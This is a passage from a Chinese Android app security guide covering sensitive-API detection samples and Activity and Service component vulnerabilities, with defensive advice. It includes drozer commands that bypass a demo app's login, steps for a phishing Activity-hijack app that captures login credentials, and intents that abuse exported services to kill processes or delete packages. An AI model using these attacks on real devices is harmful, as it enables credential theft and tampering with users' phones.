class="operator">=</span> tm.getDeviceId()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;tm&quot;</span>:<span class="class">Landroid/telephony/TelephonyManager;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Landroid/telephony/TelephonyManager;</span>-&gt;getDeviceId()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">.local</span> v0, <span class="string">&quot;DEVICE_ID&quot;</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">return-void</span><br></pre></td></tr></table></figure><h3 id="获取Android-ID敏感信息代码检测"><a href="#获取Android-ID敏感信息代码检测" class="headerlink" title="获取Android ID敏感信息代码检测"></a>获取Android ID敏感信息代码检测</h3><p>检查app是否有执行获取Android ID敏感信息的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.provider.Settings.Secure;</span><br><span class="line"><span class="type">String</span> androidId = Secure.<span class="built_in">getString</span>(<span class="built_in">getContentResolver</span>(), Secure.ANDROID_ID);</span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">Lcom/bug/sensitive/func/MainActivity;</span>-&gt;getContentResolver()<span class="class">Landroid/content/ContentResolver;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v1, <span class="string">&quot;android_id&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0, v1&#125;, <span class="class">Landroid/provider/Settings$Secure;</span></span><br><span class="line">-&gt;getString(<span class="class">Landroid/content/ContentResolver;</span><span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br></pre></td></tr></table></figure><h3 id="发送SMS敏感代码检测"><a href="#发送SMS敏感代码检测" class="headerlink" title="发送SMS敏感代码检测"></a>发送SMS敏感代码检测</h3><p>检查app是否有调用发送SMS函数。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SmsManager</span> <span class="variable">smsm</span> <span class="operator">=</span> SmsManager.getDefault();</span><br><span class="line">smsm.sendTextMessage(<span class="string">&quot;123123&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendDataMessage(<span class="string">&quot;13123&quot;</span>, <span class="string">&quot;123&quot;</span>, (<span class="type">short</span>) <span class="number">90</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendMultimediaMessage(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="文件删除代码检测"><a href="#文件删除代码检测" class="headerlink" title="文件删除代码检测"></a>文件删除代码检测</h3><p>检测app是否有调用删除文件的代码</p><p><strong>风险等级：</strong>提醒</p><p><strong>问题示例</strong></p><p>Java代码</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(<span class="string">&quot;tmp.doc&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> deleted = <span class="keyword">file</span>.<span class="keyword">delete</span>();</span><br></pre></td></tr></table></figure><p>上述代码反编译后的Dalvik/ART代码为</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new-instance v1, <span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v2, <span class="string">&quot;tmp.doc&quot;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/io/File;</span>-&gt;&lt;init&gt;(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 55</span><br><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;file&quot;</span>:<span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/io/File;</span>-&gt;delete()Z</span><br></pre></td></tr></table></figure><h3 id="signature代码检测"><a href="#signature代码检测" class="headerlink" title="signature代码检测"></a>signature代码检测</h3><p>检查app是否有调用获取signature的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PackageManager pkgManager = <span class="built_in">context</span>.getPackageManager();</span><br><span class="line"><span class="keyword">byte[] </span>signature = pkgManager.getPackageInfo(</span><br><span class="line">    <span class="built_in">context</span>.getPackageName(),</span><br><span class="line">    PackageManager.GET_SIGNATURES).signatures[<span class="number">0</span>].toByteArray(); </span><br></pre></td></tr></table></figure><p>上述代码反编译后的Dalvik/ART代码</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move-result-object v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">iget-object </span>v2, v0, <span class="class">Landroid/content/pm/PackageInfo;</span>-&gt;signatures:[<span class="class">Landroid/content/pm/Signature;</span></span><br></pre></td></tr></table></figure><h2 id="系统漏洞检测"><a href="#系统漏洞检测" class="headerlink" title="系统漏洞检测"></a>系统漏洞检测</h2><h1 id="APP一些漏洞原理"><a href="#APP一些漏洞原理" class="headerlink" title="APP一些漏洞原理"></a>APP一些漏洞原理</h1><h2 id="Activity组件的相关漏洞"><a href="#Activity组件的相关漏洞" class="headerlink" title="Activity组件的相关漏洞"></a>Activity组件的相关漏洞</h2><p><strong>(1) Activity漏洞种类</strong></p><ul><li>越权绕过</li><li>钓鱼欺诈/Activity劫持</li><li>隐私启动intent包含敏感信息</li><li>拒绝服务攻击</li></ul><p><strong>(2) Activity安全场景和危害</strong></p><p>Activity的组件导出，一般会导致的问题Android Browser Intent Scheme URLs的攻击手段</p><ul><li>拒绝服务攻击：通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验</li><li>越权攻击：Activity用户界面绕过会造成用户信息窃取，Activity界面被劫持产生欺诈等安全事件</li><li>组件导出导致钓鱼欺诈</li><li>隐式启动Intent包含敏感数据</li></ul><h3 id="Activity漏洞原理分析和复现"><a href="#Activity漏洞原理分析和复现" class="headerlink" title="Activity漏洞原理分析和复现"></a>Activity漏洞原理分析和复现</h3><h4 id="越权绕过"><a href="#越权绕过" class="headerlink" title="越权绕过"></a><strong>越权绕过</strong></h4><p><strong>原理分析</strong>：</p><p>在Android系统中，Activity默认是不导出的，如果设置了exported <code>=` `&quot;true&quot;` `这样的关键值或者是添加了&lt;intent</code>-<code>filter</code>&gt;这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。</p><p><strong>漏洞复现</strong></p><p>附件：sieve.apk</p><p>使用drozer进行分析</p><p>打开这个demo，发现需要输入账号和密码才能进入下一个Activity，我们才是越权绕过这个<code>密码验证</code>界面。</p><ul><li><p>查找该app包名 <code>run app.package.list</code></p></li><li><p>查询目标应用的攻击面，知道有三个Activity是被导出的<br><code>run app.package.attacksurface com.mwr.example.sieve</code><img src="2025-01-15-App安全分析指南/image-20240921212645899.png" alt="image-20240921212645899"></p></li><li><p>继续查询暴露的Activity信息<br><code>run app.activity.info -a com.mwr.example.sieve</code><img src="2025-01-15-App安全分析指南/image-20240921212828487.png" alt="image-20240921212828487"></p></li><li><p>说明可以进行Activity相互越权</p><p><code>run app.activity.start --component  com.mwr.example.sieve com.mwr.example.sieve.PWList</code></p></li></ul><p><strong>防护策略</strong></p><ul><li>私有Activity不应该被其他应用启动相对是安全的，创建Activity时，设置exported属性为false</li><li>公开暴露的Activity组件，可以被任意应用启动，创建Activity：设置export属性为true，谨慎处理接收的Intent，有返回数据不包含敏感信息，不应发送敏感信息，收到返回数据谨慎处理</li></ul><h4 id="钓鱼欺诈-Activity劫持"><a href="#钓鱼欺诈-Activity劫持" class="headerlink" title="钓鱼欺诈/Activity劫持"></a>钓鱼欺诈/Activity劫持</h4><p><strong>原理介绍</strong></p><p>​         Activity app中不同界面的切换通过activity的调度来实现，而activity的调度是由Activity系统中的AMS来实现的。每个应用想要启动或者停止一个进程，都报告给AMS。AMS收到启动或停止Activity的消息时，先更新内部记录，再通知相应的进程或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity会保留在系统中的一个Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。当用户按下back，顶部的Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。</p><p>​        由于Activity的这种特性，如果在启动一个activity时，给他加入一个标签FLAG_ACTIVITY_NEW_TASK，就会使他置于栈顶让他立马呈现给用户，如果这个Activity是用于盗号的伪装Activity，就会产生钓鱼安全事件或者一个Activity中有webview加载，允许加载任意网页都有可能产生钓鱼事件。</p><p><strong>实现原理：</strong><br>如果我们注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；这个service，会启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，截获正常应用的登录凭证</p><p> <strong>实现步骤：</strong><br>(<code>1</code>)启动一个服务<br>(<code>2</code>)不断扫描当前进程<br>(<code>3</code>)找到目标后弹出伪装窗口</p><p><strong>安全防护</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果真的爆发了这种恶意程序，我们并不能在启动程序时每一次都那么小心去查看判断当前在运行的是哪一个程序，当android:noHistory<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;true&quot;</span><span class="string">``</span>时上面的方法也无效</span><br><span class="line">目前，对activity劫持的防护，只能是适当给用户警示信息。一些简单的防护手段就是显示当前运行的进程提示框。</span><br><span class="line">梆梆加固则是在进程切换的时候给出提示，并使用白名单过滤。</span><br></pre></td></tr></table></figure><h4 id="隐私启动Intent包含敏感数据"><a href="#隐私启动Intent包含敏感数据" class="headerlink" title="隐私启动Intent包含敏感数据"></a>隐私启动Intent包含敏感数据</h4><p><strong>原理介绍</strong></p><p>介绍原理之前先熟悉一下Intent的隐式和显式两种</p><ul><li><p>显式方法<br><code>Intent intent = new Intent(MainActivit.this, NewActivity.class)</code></p></li><li><p>隐式方法</p><p>一般用于不同应用程序之间的数据传送</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.wooyun.test&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure></li></ul><p>原理介绍：有一个应用A，采用Intent隐式传递，他的动作是”x”，此时还有一个应用B，动作也是X，我们在启动的时候，通过隐式Intent传递，就会出现两个界面，我们不知道到底启动A还是B</p><p>因为现在这种漏洞在Android版本更新后，基本很少出现了，所以这里就不做复现和安全防护了</p><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><p><strong>原理介绍</strong></p><p>​        拒绝服务攻击源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者向应用程序发送此类空数据，异常或者畸形数据来达到使该应用crash的目的，我们可以通过intent发送空数据，异常或者畸形数据给正常应用，导致其崩溃。本地拒绝服务可以被竞争方利用攻击，使得自己的应用崩溃造成破坏。</p><p>​        危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的</p><p><strong>安全防护</strong></p><h5 id="Android外部程序的调用方法"><a href="#Android外部程序的调用方法" class="headerlink" title="Android外部程序的调用方法"></a>Android外部程序的调用方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.使用自定义的Action</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//A程翠中调用代码为：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.test.action.PLAYER&quot;</span>);              </span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//B程序中的AndroidManifest.xml中启动Activity的intent-filter</span></span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">                  &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">                   &lt;action android:name=<span class="string">&quot;com.test.action.PLAYER&quot;</span> /&gt;</span><br><span class="line">                   &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">                       &lt;!--必须，否则无效--&gt;</span><br><span class="line">                  &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用包类名</span></span><br><span class="line">                      </span><br><span class="line"><span class="comment">//A程序中调用的代码：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intetn</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;包名&quot;</span>,<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.使用ComponentName</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">comp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;包名&quot;</span>,<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">intent.setComponent(comp);</span><br><span class="line">startActivity();</span><br><span class="line"></span><br><span class="line"><span class="comment">//B程序被调用中AndroidManifest.xml中启动Activity的intent-filter不需要特别加入其它信息，如下即可：</span></span><br><span class="line">      &lt;intent-filter&gt;</span><br><span class="line">          &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">        &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">      &lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">  <span class="string">``</span>（<span class="string">``</span><span class="number">1</span><span class="string">``</span>）空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其它异常</span><br><span class="line">  <span class="string">``</span>（<span class="string">``</span><span class="number">2</span><span class="string">``</span>）谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做<span class="string">``</span><span class="keyword">try</span><span class="string">``</span>/<span class="string">``</span><span class="keyword">catch</span>处理，以及对不符合预期数据做异常处理</span><br><span class="line">总结：</span><br><span class="line"><span class="number">1.</span><span class="string">``</span>不需要被外部调用的activity设置android:exported<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;false&quot;</span><span class="string">``</span>；</span><br></pre></td></tr></table></figure><p> <strong>安全防护</strong>：</p><p>​    (1)空指针异常，类型转换异常，数组越界访问异常，类未定义异常，其他异常</p><p>​    (2)谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做<code>try/catch</code>处理，以及对不符合预期数据做异常处理</p><p>总结：</p><p>1.不需要被外部调用的activity设置android:exported<code>=</code>“false”；</p><p>2.若需要外部调用，需自定义signature或者signatureOrSystem级别的权限；</p><p>3.注册的组件请严格校验输入参数，注意空值判定和类型转换判断</p><h2 id="Service组件相关漏洞"><a href="#Service组件相关漏洞" class="headerlink" title="Service组件相关漏洞"></a>Service组件相关漏洞</h2><h3 id="service基本介绍"><a href="#service基本介绍" class="headerlink" title="service基本介绍"></a>service基本介绍</h3><p><strong>步骤</strong>：</p><ul><li>​    创建一个service服务</li><li>我们重写服务中的三大方法onCreate()，onStartCommand()，onDestory()</li></ul><p><strong>详解</strong></p><ul><li>onCreate()方法会在服务创建的时候调用</li><li>onStartCommand()方法会在每次服务启动的时候调用，通常我们希望服务在开启立刻执行某个动作就会在onStartCommand()里</li><li>onDestroy()会在服务销毁的时候调用</li></ul><h3 id="service启动"><a href="#service启动" class="headerlink" title="service启动"></a>service启动</h3><p><img src="2025-01-15-App安全分析指南/image-20240922163909306.png" alt="image-20240922163909306"></p><p><strong>启动方式</strong></p><ul><li>startService：主要用于启动一个服务执行后台任务，不进行通信，而且必须用stopService来结束，不调用会导致activity结束而Service还运行</li><li>bindService：该方法启动的服务还可以进行通信，启动的Service可以有unbindService来结束，也可以在activity结束之后自动结束</li><li>startService 同时也 bindService 启动的服务：停止服务应同时使用stopService和unbindService</li></ul><p><strong>StartService</strong></p><p>我们根据Intent的启动方式，又可以通过显式启动和隐式启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">显示启动：</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,TestService.class);</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">隐式启动：</span><br><span class="line">(<span class="number">1</span>) 使用Action </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//service中定义的action</span></span><br><span class="line">intent.setPackage(getPackageName);需要设置的应用包名</span><br><span class="line">startService(intent);</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) 使用包名启动</span><br><span class="line"><span class="type">IntenComponentName</span> <span class="variable">componentName</span> <span class="operator">=</span> New <span class="title function_">ComponentName</span><span class="params">(getPackageName()</span>,<span class="string">&quot;com.example.testservices.TestService&quot;</span>);</span><br><span class="line">intent.setComponent(componentName);</span><br><span class="line">startService(intent);<span class="type">t</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br></pre></td></tr></table></figure><h3 id="bindService启动"><a href="#bindService启动" class="headerlink" title="bindService启动"></a>bindService启动</h3><p>我们要实现服务或活动之间的通讯，我们要使用bind通信机制</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原理解析</span><br><span class="line">（<span class="number">1</span>）bindService启动的服务和调用者是典型的<span class="keyword">client</span>-service模式。调用者是<span class="keyword">client</span>，service是service端，service只有一个，但是绑定到service上的<span class="keyword">client</span>可以有一个或者多个</span><br><span class="line">（<span class="number">2</span>）<span class="keyword">client</span>可以通过IBinder接口获取Service实例，从而实现在<span class="keyword">client</span>端直接调用service，可以灵活交互</span><br><span class="line">（<span class="number">3</span>）bindService启动的服务的生命周期与绑定的<span class="keyword">client</span>息息相关，当<span class="keyword">client</span>销毁时，解除绑定，或者使用unbindService()方法解除绑定</span><br></pre></td></tr></table></figure><p><strong>实现步骤</strong></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line">（<span class="number">1</span>）定义一个类继承Service</span><br><span class="line">（<span class="number">2</span>）在Service的onBind()方法中返回IBinder类型的实例</span><br><span class="line">（<span class="number">3</span>）在service中创建binder的内部类，加入类似getService()方法返回Service，这样绑定的<span class="keyword">client</span>就可以通过getService()方法获得Service实例了</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">（<span class="number">1</span>）在Manifest中配置Service</span><br><span class="line">（<span class="number">2</span>）创建ServiceConnection类型实例，并重写onServiceConnected()方法和onServiceDisconnected()方法</span><br><span class="line">（<span class="number">3</span>）当执行到onServiceConnected回调时，可通过IBinder实例得到Service实例对象，这样可实现<span class="keyword">client</span>与Service的连接</span><br><span class="line">（<span class="number">4</span>）onServiceDisconnected回调被执行时，表示<span class="keyword">client</span>与Service断开连接，在此可以写一些断开连接后需要做的处理</span><br><span class="line">（<span class="number">5</span>）通过Intent 启动服务Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.<span class="keyword">class</span>);</span><br><span class="line">（<span class="number">6</span>）使用Context的bindService(Intent,ServiceConnection,<span class="built_in">int</span>)方法启动该Service</span><br><span class="line">（<span class="number">7</span>）不再使用时，调用unbindService(ServiceConnection)方法停止该服务</span><br></pre></td></tr></table></figure><h3 id="Service漏洞原理分析"><a href="#Service漏洞原理分析" class="headerlink" title="Service漏洞原理分析"></a>Service漏洞原理分析</h3><p><strong>漏洞种类</strong></p><ul><li>权限提升</li><li>service劫持</li><li>消息伪造</li><li>拒绝服务</li></ul><p>如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能， 这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。</p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p><strong>原理介绍</strong></p><p>当一个service配置了 intent-filter 默认是被导出的，如果没有对调用Service进行权限限制或者没有对调用者的身份进行有效验证，那么恶意构造的app都可以对此Service传入恰当的参数进行调用，导致恶意行为发生。</p><p><strong>漏洞复现</strong></p><p>案例1 <a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735"><strong>猎豹清理大师内存清理权限泄露漏洞</strong></a></p><p>漏洞描述：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Android应用程序猎豹清理大师（原金山清理大师）``<span class="number">4.0</span>``.``<span class="number">1</span>``及以下版本存在权限泄漏漏洞，泄露的权限为android<span class="selector-class">.permission</span>.RESTART_PACKAGES，用来结束进程来达到清理内存的目的。当没有申请此权限的app向猎豹清理大师发送相应的intent时，便可以结束后台运行的部分app进程。</span><br><span class="line">猎豹清理大师暴露了com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.WidgetService服务组件（详见下图），当向此服务发送action为com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程。</span><br></pre></td></tr></table></figure><p><img src="https://bbs.kanxue.com/upload/attach/202109/905443_UNDUAUVQQNFQGW6.png" alt="image-20210908160946499"></p><p><strong>攻击代码：</strong></p><p>使用intent，开启service服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p>案例二：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509"><strong>乐phone手机任意软件包安装删除漏洞</strong></a></p><p><strong>漏洞描述</strong>：</p><p>乐phone手机出厂默认包含一个名为jp.aplix.midp.tools的应用包。本应用以system权限运行，并向其他应用提供ApkInstaller服务，用来进行对Apk文件的安装和删除。通过向ApkInstaller服务传递构造好的参数，没有声明任何权限的应用即可达到安装和删除任意Package的行为，对系统安全性产生极大影响。</p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">in.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;jp.aplix.midp.tools&quot;</span>,<span class="string">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class="line">in.putExtra(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;deleteApk&quot;</span>);</span><br><span class="line">in.putExtra(<span class="string">&quot;pkgName&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">startService(in);</span><br></pre></td></tr></table></figure><h4 id="service劫持"><a href="#service劫持" class="headerlink" title="service劫持"></a>service劫持</h4><p><strong>攻击原理</strong>：隐式启动service，当存在同名service时，先安装应用的service优先级高</p><h4 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h4><p><strong>原理介绍</strong>：</p><p>暴露的service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患</p><p><strong>漏洞复现</strong></p><p>案例：<a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635"><strong>优酷Android 4.5客户端升级漏洞</strong></a></p><p><strong>漏洞描述</strong></p><p>优酷Android 4.5客户端组件暴露导致第三方应用可以触发其升级过程，同时可以指定升级下载的URL地址，可导致任意应用安装！</p><p>暴露组件：<code>com.youku.service.push.StartActivityService</code></p><p>该组件对应的部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHandleIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Intent v0;</span><br><span class="line">        String v23;</span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">pushMsg</span> <span class="operator">=</span> intent.getSerializableExtra(<span 